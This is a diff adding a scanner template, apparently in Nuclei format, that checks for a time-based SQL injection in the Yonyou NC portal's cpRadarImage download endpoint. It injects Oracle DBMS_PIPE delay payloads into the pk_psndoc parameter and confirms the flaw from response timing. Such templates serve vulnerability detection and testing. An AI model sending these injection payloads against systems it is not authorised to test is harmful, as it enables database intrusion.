@@ -1,0 +1,27 @@
+id: poc-yaml-yongyou-nc-cpradarimage-sqli
+info:
+  name: "用友 NC cpRadarImage SQL注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 用友NC
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/pt/cpRadarImage/download?object_id=1&object_type=1&pageId=login&pk_psndoc=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--&size=0"
+      - "{{BaseURL}}/portal/pt/cpRadarImage/download?object_id=1&object_type=1&pageId=login&pk_psndoc=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',8)--&size=0"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "image/png"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
